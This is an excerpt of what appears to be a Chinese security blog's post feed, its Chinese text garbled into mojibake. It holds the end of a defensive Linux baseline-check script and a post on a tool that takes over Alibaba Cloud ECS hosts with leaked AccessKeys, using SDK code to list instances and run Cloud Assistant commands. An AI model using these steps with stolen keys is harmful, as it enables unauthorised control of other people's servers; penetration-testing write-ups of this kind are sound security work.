fileRhosts=`find / -xdev -mount -name .rhosts -print 2&gt; /dev/null`</span></span><br><span class="line"><span class="string">  if [ -z &quot;</span><span class="variable">$fileRhosts</span><span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] ä¸å­˜åœ¨.rhostsæ–‡ä»¶ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] å­˜åœ¨.rhostsæ–‡ä»¶ï¼Œä¸ç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`å¼‚å¸¸éšå«æ–‡ä»¶æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[12] å¼‚å¸¸éšå«æ–‡ä»¶æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  hideFile=<span class="subst">$(find / -xdev -mount \( -name <span class="string">&quot;..*&quot;</span> -o -name <span class="string">&quot;...*&quot;</span> \) 2&gt; /dev/null)</span></span></span><br><span class="line"><span class="string">  if [  -z &quot;</span><span class="variable">$&#123;hideFile&#125;</span><span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] ä¸å­˜åœ¨éšè—æ–‡ä»¶ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] å­˜åœ¨éšè—æ–‡ä»¶ï¼Œå»ºè®®ä»”ç»†æ£€æŸ¥ï¼š<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  for i in <span class="variable">$&#123;hideFile&#125;</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">   echo <span class="variable">$i</span> &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  fi  </span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`syslogç™»å½•äº‹ä»¶æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[13] syslogç™»å½•äº‹ä»¶æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  if [  -f &quot;</span>/etc/syslog.conf<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    logFile=<span class="subst">$(cat /etc/syslog.conf | grep -V ^# | grep authpriv.*)</span></span></span><br><span class="line"><span class="string">    if [ ! -z &quot;</span><span class="variable">$&#123;logFile&#125;</span><span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[Y] å­˜åœ¨ä¿å­˜authpirvçš„æ—¥å¿—æ–‡ä»¶<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] ä¸å­˜åœ¨ä¿å­˜authpirvçš„æ—¥å¿—æ–‡ä»¶<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] ä¸å­˜åœ¨ï¼etc/syslog.confæ–‡ä»¶ï¼Œå»ºè®®å¯¹æ‰€æœ‰ç™»å½•äº‹ä»¶éƒ½è®°å½•<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi  </span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`æ—¥å¿—å®¡æ ¸åŠŸèƒ½æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[14] æ—¥å¿—å®¡æ ¸åŠŸèƒ½æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  auditdStatus=<span class="subst">$(service auditd status 2&gt; /dev/null)</span></span></span><br><span class="line"><span class="string">  if [ $? = 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] ç³»ç»Ÿæ—¥å¿—å®¡æ ¸åŠŸèƒ½å·²å¼€å¯ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ $? = 3 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] ç³»ç»Ÿæ—¥å¿—å®¡æ ¸åŠŸèƒ½å·²å…³é—­ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®service auditd startå¼€å¯<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`ç³»ç»Ÿcore dumpçŠ¶æ€æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[15] ç³»ç»Ÿcore dumpçŠ¶æ€æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  limitsFile=<span class="subst">$(cat /etc/security/limits.conf | grep -V ^# | grep core)</span></span></span><br><span class="line"><span class="string">  if [ $? -eq 0 ];then</span></span><br><span class="line"><span class="string">    soft=`cat /etc/security/limits.conf | grep -V ^# | grep core | awk &#123;print <span class="variable">$2</span>&#125;`</span></span><br><span class="line"><span class="string">    for i in <span class="variable">$soft</span></span></span><br><span class="line"><span class="string">    do</span></span><br><span class="line"><span class="string">      if [ &quot;</span><span class="variable">$i</span><span class="string">&quot;x = &quot;</span>soft<span class="string">&quot;x ];then</span></span><br><span class="line"><span class="string">        echo &quot;</span>[Y] * soft core 0 å·²ç»è®¾ç½®<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      fi</span></span><br><span class="line"><span class="string">      if [ &quot;</span><span class="variable">$i</span><span class="string">&quot;x = &quot;</span>hard<span class="string">&quot;x ];then</span></span><br><span class="line"><span class="string">        echo &quot;</span>[Y] * hard core 0 å·²ç»è®¾ç½®<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      fi</span></span><br><span class="line"><span class="string">    done</span></span><br><span class="line"><span class="string">  else </span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] æ²¡æœ‰è®¾ç½®coreï¼Œå»ºè®®åœ¨/etc/security/limits.confä¸­æ·»åŠ * soft core 0å’Œ* hard core 0<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">  cat  <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo -e &quot;</span>\033[36mè¾“å‡ºç»“æœ<span class="string">&quot;<span class="variable">$scanner_log</span>&quot;</span> \033[0m<span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">bk_safe</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„šæœ¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é˜¿é‡Œäº‘ä¸»æœºaccesskeyåˆ©ç”¨å·¥å…·</title>
      <link href="2020/12/21/%E9%98%BF%E9%87%8C%E4%BA%91%E4%B8%BB%E6%9C%BAaccesskey%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>2020/12/21/%E9%98%BF%E9%87%8C%E4%BA%91%E4%B8%BB%E6%9C%BAaccesskey%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹ï¼ˆGammaå®éªŒå®¤ç¬¬äºŒä¸ªå¼€æºå·¥å…·ï¼‰"><a href="#ç®€ä»‹ï¼ˆGammaå®éªŒå®¤ç¬¬äºŒä¸ªå¼€æºå·¥å…·ï¼‰" class="headerlink" title="ç®€ä»‹ï¼ˆGammaå®éªŒå®¤ç¬¬äºŒä¸ªå¼€æºå·¥å…·ï¼‰"></a>ç®€ä»‹ï¼ˆGammaå®éªŒå®¤ç¬¬äºŒä¸ªå¼€æºå·¥å…·ï¼‰</h1><p>åœ¨æ—¥å¸¸æ¸—é€è¿‡ç¨‹ä¸­æˆ‘ä»¬ç»å¸¸é‡åˆ°ä¿¡æ¯æ³„éœ²å‡ºALIYUN_ACCESSKEYIDä¸ALIYUN_ACCESSKEYSECRETï¼ˆé˜¿é‡Œäº‘API keyï¼‰ï¼Œç‰¹åˆ«æ˜¯laravelæ¡†æ¶å¾—debugä¿¡æ¯ã€‚APPä¸­ä¹Ÿä¼šæ³„éœ²è¿™äº›ä¿¡æ¯ã€‚</p><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>æˆ‘ä»¬è¯´ä¸‹é˜¿é‡ŒAPIæœ‰ä»€ä¹ˆç”¨å§ï¼Œä»¥ä¸‹æ˜¯å®˜æ–¹è¯´æ˜ï¼š</p><p>äº‘æœåŠ¡å™¨ï¼ˆElastic Compute Serviceï¼ŒECSï¼‰ï¼Œå¯ä»¥è°ƒç”¨APIç®¡ç†æ‚¨çš„äº‘ä¸Šèµ„æºå’Œå¼€å‘è‡ªå·±çš„åº”ç”¨ç¨‹åºã€‚<br>ECS APIæ”¯æŒHTTPæˆ–è€…HTTPSç½‘ç»œè¯·æ±‚åè®®ï¼Œå…è®¸GETå’ŒPOSTæ–¹æ³•ã€‚æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è°ƒç”¨ECS API<br>è¯¦æƒ…å‚è€ƒé˜¿é‡Œäº‘å®˜æ–¹APIæ–‡æ¡£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;help.aliyun.com&#x2F;document_detail&#x2F;25484.html?spm&#x3D;a2c4g.11186623.6.1276.12244f88jytZ8c</span><br></pre></td></tr></table></figure><h1 id="å¼€å‘æ€è·¯"><a href="#å¼€å‘æ€è·¯" class="headerlink" title="å¼€å‘æ€è·¯"></a>å¼€å‘æ€è·¯</h1><h3 id="1ã€é€šè¿‡é˜¿é‡Œäº‘SDKä½¿ç”¨"><a href="#1ã€é€šè¿‡é˜¿é‡Œäº‘SDKä½¿ç”¨" class="headerlink" title="1ã€é€šè¿‡é˜¿é‡Œäº‘SDKä½¿ç”¨"></a>1ã€é€šè¿‡é˜¿é‡Œäº‘SDKä½¿ç”¨</h3><p>SDKä¸‹è½½åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;aliyun&#x2F;aliyun-openapi-python-sdk</span><br></pre></td></tr></table></figure><p>pipå®‰è£…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Install the core library</span><br><span class="line">pip install aliyun-python-sdk-core</span><br><span class="line"> # Install the ECS management library</span><br><span class="line">pip install aliyun-python-sdk-ecs</span><br><span class="line"> # Install the RDS management library</span><br><span class="line">pip install aliyun-python-sdk-rds</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æŸ¥è¯¢ecsä¸»æœº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from aliyunsdkcore.client import AcsClient</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ClientException</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ServerException</span><br><span class="line">from aliyunsdkecs.request.v20140526.DescribeInstancesRequest import DescribeInstancesRequest</span><br><span class="line">client &#x3D; AcsClient(&#39;&lt;accessKeyId&gt;&#39;, &#39;&lt;accessSecret&gt;&#39;, &#39;cn-hangzhou&#39;)</span><br><span class="line">request &#x3D; DescribeInstancesRequest()</span><br><span class="line">request.set_accept_format(&#39;json&#39;)</span><br><span class="line">response &#x3D; client.do_action_with_exception(request)</span><br><span class="line"># python2:  print(response) </span><br><span class="line">print(str(response, encoding&#x3D;&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from aliyunsdkcore.client import AcsClient</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ClientException</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ServerException</span><br><span class="line">from aliyunsdkecs.request.v20140526.CreateCommandRequest import CreateCommandRequest</span><br><span class="line">client &#x3D; AcsClient(&#39;&lt;accessKeyId&gt;&#39;, &#39;&lt;accessSecret&gt;&#39;, &#39;cn-hangzhou&#39;)</span><br><span class="line">request &#x3D; CreateCommandRequest()</span><br><span class="line">request.set_accept_format(&#39;json&#39;)</span><br><span class="line">response &#x3D; client.do_action_with_exception(request)</span><br><span class="line"># python2:  print(response) </span><br><span class="line">print(str(response, encoding&#x3D;&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šè¿”å›ä¸€ä¸ªäº‘åŠ©æ‰‹å‘½ä»¤idï¼Œè¿”å›ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;RequestId&quot;: &quot;E69EF3CC-94CD-42E7-8926-F133B86387C0&quot;,</span><br><span class="line">&quot;CommandId&quot;: &quot;c-7d2a745b412b4601b2d47f6a768d3a14&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from aliyunsdkcore.client import AcsClient</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ClientException</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ServerException</span><br><span class="line">from aliyunsdkecs.request.v20140526.InvokeCommandRequest import InvokeCommandRequest</span><br><span class="line">client &#x3D; AcsClient(&#39;&lt;accessKeyId&gt;&#39;, &#39;&lt;accessSecret&gt;&#39;, &#39;cn-hangzhou&#39;)</span><br><span class="line">request &#x3D; InvokeCommandRequest()</span><br><span class="line">request.set_accept_format(&#39;json&#39;)</span><br><span class="line">response &#x3D; client.do_action_with_exception(request)</span><br><span class="line"># python2:  print(response) </span><br><span class="line">print(str(response, encoding&#x3D;&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure><p>è¿”å›ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;RequestId&quot;: &quot;E69EF3CC-94CD-42E7-8926-F133B86387C0&quot;,</span><br><span class="line">&quot;InvokeId&quot;: &quot;t-7d2a745b412b4601b2d47f6a768d3a14&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®‰å…¨ç»„éƒ¨åˆ†å°±çœç•¥äº†ï¼Œæ ¹æ®APIæ–‡æ¡£</p><h3 id="2ã€é€šè¿‡GET-POST-ä½¿ç”¨"><a href="#2ã€é€šè¿‡GET-POST-ä½¿ç”¨" class="headerlink" title="2ã€é€šè¿‡GET/POST ä½¿ç”¨"></a>2ã€é€šè¿‡GET/POST ä½¿ç”¨</h3><p>è¿™é‡Œå…ˆè¯´ä¸‹å…¬å…±è¯·æ±‚å‚æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/881799538.png"></p><h6 id="2-1-GETè¯·æ±‚"><a href="#2-1-GETè¯·æ±‚" class="headerlink" title="2.1 GETè¯·æ±‚"></a>2.1 GETè¯·æ±‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ecs.aliyuncs.com&#x2F;?Action&#x3D;DescribeInstanceStatus</span><br><span class="line">&amp;RegionId&#x3D;cn-hangzhou</span><br><span class="line">&amp;PageSize&#x3D;1</span><br><span class="line">&amp;PageNumber&#x3D;1</span><br><span class="line">&amp;InstanceId.1&#x3D;i-bp1j4i2jdf3owlhe****</span><br><span class="line">&amp;&lt;å…¬å…±è¯·æ±‚å‚æ•°&gt;</span><br></pre></td></tr></table></figure><p>XMLè¿”å›æ ¼å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;DescribeInstanceStatusResponse&gt;</span><br><span class="line">&lt;PageNumber&gt;1&lt;&#x2F;PageNumber&gt;</span><br><span class="line">&lt;InstanceStatuses&gt;</span><br><span class="line">&lt;InstanceStatus&gt;</span><br><span class="line">&lt;Status&gt;Running&lt;&#x2F;Status&gt;</span><br><span class="line">&lt;InstanceId&gt;i-bp1j4i2jdf3owlhe****&lt;&#x2F;InstanceId&gt;</span><br><span class="line">&lt;&#x2F;InstanceStatus&gt;</span><br><span class="line">&lt;&#x2F;InstanceStatuses&gt;</span><br><span class="line">&lt;TotalCount&gt;58&lt;&#x2F;TotalCount&gt;</span><br><span class="line">&lt;PageSize&gt;1&lt;&#x2F;PageSize&gt;</span><br><span class="line">&lt;RequestId&gt;746C3444-9A24-4D7D-B8A8-DCBF7AC8BD66&lt;&#x2F;RequestId&gt;</span><br><span class="line">&lt;&#x2F;DescribeInstanceStatusResponse&gt;</span><br></pre></td></tr></table></figure><p>JSONè¿”å›æ ¼å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;PageNumber&quot;: 1,</span><br><span class="line">&quot;InstanceStatuses&quot;: &#123;</span><br><span class="line">&quot;InstanceStatus&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">&quot;Status&quot;: &quot;Running&quot;,</span><br><span class="line">&quot;InstanceId&quot;: &quot;i-bp1j4i2jdf3owlhe****&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">&quot;TotalCount&quot;: 58,</span><br><span class="line">&quot;PageSize&quot;: 1,</span><br><span class="line">&quot;RequestId&quot;: &quot;746C3444-9A24-4D7D-B8A8-DCBF7AC8BD66&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="2-2-POSTè¯·æ±‚"><a href="#2-2-POSTè¯·æ±‚" class="headerlink" title="2.2 POSTè¯·æ±‚"></a>2.2 POSTè¯·æ±‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ecs.aliyuncs.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko&#x2F;20100101 Firefox&#x2F;84.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line">Action&#x3D;DescribeInstanceStatus&amp;RegionId&#x3D;cn-hangzhou&amp;PageSize&#x3D;1&amp;PageNumber&#x3D;1&amp;InstanceId.1&#x3D;i-bp1j4i2jdf3owlhe****&amp;&lt;å…¬å…±è¯·æ±‚å‚æ•°&gt;</span><br></pre></td></tr></table></figure><p>è¿”å›è·ŸGETæ–¹å¼ä¸€æ ·</p><h1 id="å·¥å…·ä½¿ç”¨"><a href="#å·¥å…·ä½¿ç”¨" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h1><p>å›¾å½¢åŒ–ç•Œé¢ï¼Œæ²¡ä»€ä¹ˆè¯´çš„ã€‚é™„ä¸€å¼ æˆªå›¾ç›¸ä¿¡å¤§å®¶éƒ½æ˜ç™½äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1351824295.png"></p><h1 id="ç»“æŸ"><a href="#ç»“æŸ" class="headerlink" title="ç»“æŸ"></a>ç»“æŸ</h1><p>é˜¿é‡Œäº‘ä¸ºè¿ç»´äººå‘˜ä¸å¼€å‘äººå‘˜æä¾›äº†æ–¹ä¾¿ï¼Œä½†åŒæ—¶è‡ªèº«ä¹Ÿè¦åŠ å¼ºå®‰å…¨æ„è¯†ï¼Œæ³¨æ„è‡ªå·±çš„keyä¸è¦æ³„éœ²ï¼Œä¸ç„¶ç›´æ¥æ¥ç®¡é˜¿é‡Œäº‘æ‰€æœ‰escä¸»æœºï¼Œé£é™©æ¯”ä¸€èˆ¬é«˜å±æ¼æ´éƒ½è¿˜è¦é«˜ã€‚</p><blockquote><p>ä¸‹è½½é“¾æ¥åŠæ¼æ´æ–‡ç« <br>é¡¹ç›®é“¾æ¥ï¼š<br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a><br>å·¥å…·ä¸‹è½½é“¾æ¥ï¼š<br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools/releases/download/1.0/Aliyun-.AK.Tools.exe">https://github.com/mrknow001/aliyun-accesskey-Tools/releases/download/1.0/Aliyun-.AK.Tools.exe</a></p><p>æ¬¢è¿å…³æ³¨Gammaå®éªŒå®¤,åç»­ä¼šæ¨å‡ºæ›´å¤šå®ç”¨æ–¹ä¾¿çš„å·¥å…·ï¼Œçˆ±æ‚¨ï¼<br>æ–‡ç« é“¾æ¥ï¼š<br><a href="https://www.freebuf.com/articles/web/255717.html">https://www.freebuf.com/articles/web/255717.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JaFakï¼šä¸€æ¬¾æ— è§†jså‰ç«¯åŠ å¯†çš„è´¦å·å¯†ç çˆ†ç ´å·¥å…·</title>
      <link href="2020/12/13/JaFak/"/>
      <url>2020/12/13/JaFak/</url>
      
